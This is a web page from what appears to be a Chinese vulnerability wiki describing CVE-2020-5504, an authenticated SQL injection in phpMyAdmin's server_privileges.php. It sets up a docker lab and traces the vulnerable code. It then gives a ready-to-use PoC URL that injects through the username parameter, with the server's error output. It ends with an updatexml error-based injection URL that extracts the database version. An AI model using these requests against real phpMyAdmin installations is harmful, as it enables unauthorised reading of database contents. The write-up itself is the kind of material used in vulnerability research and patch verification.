<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpmyadmin/%EF%BC%88CVE-2020-5504%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-5504\uff09Phpmyadmin \u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" class="btn btn-xs btn-link">
        （CVE-2019-18622）Phpmyadmin xss
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-5504phpmyadmin-sql">（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞<a class="headerlink" href="#cve-2020-5504phpmyadmin-sql" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>在用户帐户页面中发现了一个SQL注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义SQL来代替其自己的用户名。攻击者必须具有有效的MySQL帐户才能访问服务器。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Phpmyadmin \&lt;= 5.00</p>
<p>Phpmyadmin \&lt;= 4.94</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>docker一把梭</p>
<div class="codehilite"><pre><span></span><code>docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6
</code></pre></div>

<p>`docker run --name myadmin -d --link mysql5.7:db -p 8080:80
phpmyadmin/phpmyadmin:5.0</p>
<h3 id="poc">溯源和构造poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<p>下载前一个版本
5.0.0的<a href="https://files.phpmyadmin.net/phpMyAdmin/5.0.0/phpMyAdmin-5.0.0-english.zip">代码压缩包</a>后,
打开<code>libraries/classes/Server/Privileges.php</code> 来到对应行.</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="n">$_GET</span><span class="err">[</span><span class="s1">&#39;validate_username&#39;</span><span class="err">]</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">$sql_query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;SELECT * FROM `mysql`.`user` WHERE `User` = &#39;&quot;</span>
<span class="w">                </span><span class="p">.</span><span class="w"> </span><span class="n">$_GET</span><span class="err">[</span><span class="s1">&#39;username&#39;</span><span class="err">]</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="n">省略</span><span class="w"> </span><span class="n">节省篇幅</span>
<span class="w">        </span><span class="err">}</span>
</code></pre></div>

<p>很显然可以看出注入点是<code>$_GET['username']</code>,而需要设置<code>$_GET['validate_username']</code></p>
<p>往上看, 这段代码位于<code>public function getExtraDataForAjaxBehavior</code>函数.</p>
<p>搜索上层调用来到<code>/server_privileges.php</code> 的这段代码</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">isAjax</span><span class="p">()</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;ajax_page_request&#39;</span><span class="p">])</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;export&#39;</span><span class="p">])</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit_mult&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit_mult&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;export&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">((</span><span class="o">!</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;initial&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;initial&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb nb-Type">null</span>
<span class="w">    </span><span class="o">||</span><span class="w"> </span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;initial&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="n">__</span><span class="p">(</span><span class="s1">&#39;Go&#39;</span><span class="p">)))</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;showall&#39;</span><span class="p">])</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;edit_user_group_dialog&#39;</span><span class="p">])</span>
<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">$</span><span class="n">extra_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">serverPrivileges</span><span class="o">-&gt;</span><span class="n">getExtraDataForAjaxBehavior</span><span class="p">(</span>
<span class="w">        </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">),</span>
<span class="w">        </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">sql_query</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">sql_query</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">),</span>
<span class="w">        </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">hostname</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">hostname</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">),</span>
<span class="w">        </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">message</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">message</span><span class="w"> </span><span class="n">instanceof</span><span class="w"> </span><span class="n">Message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">setRequestStatus</span><span class="p">(</span><span class="o">$</span><span class="n">message</span><span class="o">-&gt;</span><span class="n">isSuccess</span><span class="p">());</span>
<span class="w">        </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">addJSON</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">message</span><span class="p">);</span>
<span class="w">        </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">addJSON</span><span class="p">(</span><span class="o">$</span><span class="n">extra_data</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>可以发现if里大部分条件都可控, 除了<code>$response-&gt;isAjax()</code></p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">isAjax</span><span class="p">()</span><span class="o">:</span><span class="w"> </span><span class="n">bool</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_isAjax</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>查看构造函数</p>
<div class="codehilite"><pre><span></span><code><span class="o">/**</span>
<span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="n">Creates</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">instance</span>
<span class="w">     </span><span class="o">*/</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">defined</span><span class="p">(</span><span class="s1">&#39;TESTSUITE&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputBuffering</span><span class="p">::</span><span class="n">getInstance</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">();</span>
<span class="w">            </span><span class="n">register_shutdown_function</span><span class="p">([</span><span class="o">$</span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;response&#39;</span><span class="p">]);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Header</span><span class="p">();</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_HTML</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_JSON</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_footer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Footer</span><span class="p">();</span>

<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_isSuccess</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_isDisabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">setAjax</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;ajax_request&#39;</span><span class="p">]));</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_CWD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getcwd</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>可以看到这条件在于<code>$_REQUEST['ajax_request']</code>是否为空.</p>
<p>根据上面的几个条件 我们可以构造出如下最简单的poc</p>
<div class="codehilite"><pre><span></span><code>http://127.0.0.1:8080/server_privileges.php?ajax_request=true&amp;validate_username=true&amp;username=test%27%22
</code></pre></div>

<p>登陆后(这个操作需要权限) 尝试访问上面的url.返回如下</p>
<div class="codehilite"><pre><span></span><code><span class="err">{</span><span class="s2">&quot;success&quot;</span><span class="o">:</span><span class="no">false</span><span class="p">,</span><span class="s2">&quot;error&quot;</span><span class="o">:</span><span class="s2">&quot;&lt;div class=</span><span class="se">\&quot;</span><span class="s2">error</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;h1&gt;Error&lt;</span><span class="err">\</span><span class="s2">/h1&gt;&lt;p&gt;&lt;strong&gt;Static analysis:&lt;</span><span class="err">\</span><span class="s2">/strong&gt;&lt;</span><span class="err">\</span><span class="s2">/p&gt;&lt;p&gt;1 errors were found during analysis.&lt;</span><span class="err">\</span><span class="s2">/p&gt;&lt;p&gt;&lt;ol&gt;&lt;li&gt;Ending quote </span><span class="se">\&quot;</span><span class="s2"> was expected. (near </span><span class="se">\&quot;\&quot;</span><span class="s2"> at position 53)&lt;</span><span class="err">\</span><span class="s2">/li&gt;&lt;</span><span class="err">\</span><span class="s2">/ol&gt;&lt;</span><span class="err">\</span><span class="s2">/p&gt;&lt;p&gt;&lt;strong&gt;SQL query:&lt;</span><span class="err">\</span><span class="s2">/strong&gt;  &lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">copyQueryBtn</span><span class="se">\&quot;</span><span class="s2"> data-text=</span><span class="se">\&quot;</span><span class="s2">SELECT * FROM `mysql`.`user` WHERE `User` = &#39;test&#39;&amp;quot;&#39;;</span><span class="se">\&quot;</span><span class="s2">&gt;Copy&lt;</span><span class="err">\</span><span class="s2">/a&gt;</span><span class="se">\n</span><span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">.</span><span class="err">\</span><span class="s2">/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Fselect.html</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">mysql_doc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">themes</span><span class="err">\</span><span class="s2">/dot.gif</span><span class="se">\&quot;</span><span class="s2"> title=</span><span class="se">\&quot;</span><span class="s2">Documentation</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Documentation</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">icon ic_b_help</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;</span><span class="err">\</span><span class="s2">/a&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">server_sql.php?sql_query=SELECT+%2A+FROM+%60mysql%60.%60user%60+WHERE+%60User%60+%3D+%27test%27%22%27%3B&amp;amp;show_query=1</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;span class=</span><span class="se">\&quot;</span><span class="s2">nowrap</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">themes</span><span class="err">\</span><span class="s2">/dot.gif</span><span class="se">\&quot;</span><span class="s2"> title=</span><span class="se">\&quot;</span><span class="s2">Edit</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Edit</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">icon ic_b_edit</span><span class="se">\&quot;</span><span class="s2">&gt;&amp;nbsp;Edit&lt;</span><span class="err">\</span><span class="s2">/span&gt;&lt;</span><span class="err">\</span><span class="s2">/a&gt;    &lt;</span><span class="err">\</span><span class="s2">/p&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;</span><span class="se">\n</span><span class="s2">SELECT * FROM `mysql`.`user` WHERE `User` = &#39;test&#39;&amp;quot;&#39;;</span><span class="se">\n</span><span class="s2">&lt;</span><span class="err">\</span><span class="s2">/p&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;</span><span class="se">\n</span><span class="s2">    &lt;strong&gt;MySQL said: &lt;</span><span class="err">\</span><span class="s2">/strong&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">.</span><span class="err">\</span><span class="s2">/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Ferror-messages-server.html</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">mysql_doc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">themes</span><span class="err">\</span><span class="s2">/dot.gif</span><span class="se">\&quot;</span><span class="s2"> title=</span><span class="se">\&quot;</span><span class="s2">Documentation</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Documentation</span><span class="se">\&quot;</span><span class="s2"> class=</span><span class="se">\&quot;</span><span class="s2">icon ic_b_help</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;</span><span class="err">\</span><span class="s2">/a&gt;</span><span class="se">\n</span><span class="s2">&lt;</span><span class="err">\</span><span class="s2">/p&gt;</span><span class="se">\n</span><span class="s2">&lt;code&gt;#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&amp;quot;&#39;&#39; at line 1&lt;</span><span class="err">\</span><span class="s2">/code&gt;&lt;br&gt;&lt;</span><span class="err">\</span><span class="s2">/div&gt;&quot;</span><span class="err">}</span>
</code></pre></div>

<p>一个sql报错信息, 说明这个最短poc生效了</p>
<p>利用的话 反正都回显了 直接updatexml报错注入</p>
<div class="codehilite"><pre><span></span><code><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">server_privileges</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">ajax_request</span><span class="o">=</span><span class="k">true</span><span class="o">&amp;</span><span class="n">validate_username</span><span class="o">=</span><span class="k">true</span><span class="o">&amp;</span><span class="n">username</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="p">(</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">SELECT</span><span class="o">%</span><span class="mi">20</span><span class="nb">@@version</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="o">%</span><span class="mi">20</span><span class="c1">--%20</span>
</code></pre></div>

<p>在返回最下面可以看到<code>#1105 - XPATH syntax error: '~5.6.46~'</code></p>
<h3 id="_5">后言<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>这个洞要求一个可以登录的账号才能注入. ,
另外这个请求似乎也不需要<code>csrf-token</code>(不过似乎没什么用)</p>
<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7092">https://xz.aliyun.com/t/7092</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" class="btn btn-xs btn-link">
        （CVE-2019-18622）Phpmyadmin xss
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>